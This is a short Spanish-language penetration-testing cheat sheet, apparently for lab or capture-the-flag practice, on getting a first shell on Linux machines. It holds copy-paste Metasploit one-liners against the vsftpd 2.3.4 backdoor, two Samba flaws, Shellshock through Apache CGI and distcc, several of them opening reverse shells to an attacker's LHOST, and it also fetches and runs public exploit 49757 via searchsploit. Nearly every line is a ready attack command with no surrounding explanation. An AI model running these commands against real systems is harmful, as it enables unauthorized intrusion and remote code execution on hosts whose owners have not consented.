# FOOTHOLD LINUX — vsftpd, Samba, Shellshock

## vsftpd 2.3.4 — Backdoor (Puerto 21)
```bash
# MSF (no necesita LHOST — bind shell)
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS <TARGET_IP>; set payload cmd/unix/interact; run; exit -y"

# Manual
searchsploit vsftpd
searchsploit -m 49757
python3 49757.py <TARGET_IP>
```

## Samba 3.0.20 — usermap_script (Puerto 445)
```bash
msfconsole -q -x "use exploit/multi/samba/usermap_script; set RHOSTS <TARGET_IP>; set payload cmd/unix/interact; run; exit -y"
```

## Samba 3.x-4.x — is_known_pipename (Puerto 445)
```bash
msfconsole -q -x "use exploit/linux/samba/is_known_pipename; set RHOSTS <TARGET_IP>; run; exit -y"
```

## Shellshock — Apache mod_cgi (Puerto 80)
```bash
nmap -sV --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" <TARGET_IP>

msfconsole -q -x "use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS <TARGET_IP>; set TARGETURI /gettime.cgi; set LHOST <LHOST>; run; exit -y"
```

## distcc (Puerto 3632)
```bash
msfconsole -q -x "use exploit/unix/misc/distcc_exec; set RHOSTS <TARGET_IP>; set payload cmd/unix/reverse; set LHOST <LHOST>; set LPORT 4444; run; exit -y"
```
